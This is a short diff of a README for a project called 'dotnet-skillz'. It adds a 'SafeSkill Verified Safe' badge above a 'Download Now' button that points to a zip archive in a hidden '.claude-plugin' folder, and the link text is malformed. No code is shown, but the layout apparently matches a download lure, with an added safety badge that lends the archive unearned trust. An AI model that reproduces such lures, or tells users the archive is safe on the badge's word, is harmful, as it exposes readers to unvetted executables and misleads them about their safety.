@@ -1,5 +1,7 @@
 # 🎯 dotnet-skillz - Enhance Your Dotnet Applications
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/prakash-77599-dotnet-skillz)
+
 ## 📥 Download Now
 [![Download](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip%https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip)](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip)
 
